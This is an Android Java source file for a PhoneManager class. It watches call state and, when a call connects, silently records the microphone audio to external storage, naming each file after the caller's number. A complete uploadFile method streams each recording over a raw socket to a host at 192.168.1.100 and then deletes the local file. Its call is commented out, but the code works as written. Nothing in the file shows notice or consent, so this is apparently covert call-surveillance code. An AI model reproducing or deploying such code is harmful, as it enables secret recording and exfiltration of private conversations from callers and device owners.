package com.dragon.android.spirit.phone;

import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.dragon.android.spirit.utilities.StreamTool;
import com.orhanobut.logger.Logger;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

/**
 * Created by raymondlee on 2018/1/14.
 */
public class PhoneManager {

    private static PhoneManager sInstance = new PhoneManager();

    private PhoneManager() {}

    public static PhoneManager getInstance() {
        return sInstance;
    }

    private static final String FILE_DIR =
            Environment.getExternalStorageDirectory() + File.separator +
                    "AndSprite" + File.separator + "telephone" + File.separator;

    public void init(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE); //取得电话相关服务
        telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
    }

    private final class PhoneListener extends PhoneStateListener {
        private String incomingNumber;
        private MediaRecorder mediaRecorder;
        private File file;

        /**
         * 回调函数
         */
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:// 来电
                        Logger.i( "ringing");
                        this.incomingNumber = incomingNumber;
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:// 接通电话
                        Logger.i( "offhook");
                        File dir = new File(FILE_DIR);
                        if(!dir.exists()) {
                            dir.mkdirs();
                        }
                        Logger.i( "dir: " + FILE_DIR);
                        file = new File(FILE_DIR,
                                incomingNumber + System.currentTimeMillis()
                                        + ".3gp");
//                        if(!file.exists()) {
//                            file.createNewFile();
//                        }
                        Logger.i( "file: " + file.getAbsolutePath());
                        mediaRecorder = new MediaRecorder();
                        // 从麦克风采集声音
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        // 内容输出格式
                        mediaRecorder
                                .setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        // 音频编码方式
                        mediaRecorder
                                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        // 输出文件位置
                        mediaRecorder.setOutputFile(file.getAbsolutePath());
                        // 预期准备
                        mediaRecorder.prepare();
                        // 开始刻录音频
                        mediaRecorder.start();
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:// 挂断电话后回归到空闲状态
                        Logger.i( "idle");
                        if (mediaRecorder != null) {
                            // 停止刻录
                            mediaRecorder.stop();
                            // 刻录完成一定要释放资源
                            mediaRecorder.release();
                            mediaRecorder = null;
                            // 上传录制好的音频文件
                            //uploadFile();
                        }
                        break;
                    default:
                        break;
                }
            } catch (Exception e) {
                Logger.e( "error");
                e.printStackTrace();
            }
        }

        /**
         * 上传录制好的音频文件
         */
        private void uploadFile() {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (file != null && file.exists()) {
                            Socket socket = new Socket("192.168.1.100", 7878);
                            OutputStream outStream = socket.getOutputStream();
                            String head = "Content-Length=" + file.length()
                                    + ";filename=" + file.getName()
                                    + ";sourceid=\r\n";
                            outStream.write(head.getBytes());

                            PushbackInputStream inStream = new PushbackInputStream(
                                    socket.getInputStream());
                            String response = StreamTool.readLine(inStream);
                            String[] items = response.split(";");
                            String position = items[1].substring(items[1]
                                    .indexOf("=") + 1);

                            RandomAccessFile fileOutStream = new RandomAccessFile(
                                    file, "r");
                            fileOutStream.seek(Integer.valueOf(position));
                            byte[] buffer = new byte[1024];
                            int len = -1;
                            while ((len = fileOutStream.read(buffer)) != -1) {
                                outStream.write(buffer, 0, len);
                            }
                            fileOutStream.close();
                            outStream.close();
                            inStream.close();
                            socket.close();
                            file.delete();
                            file = null;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }
}
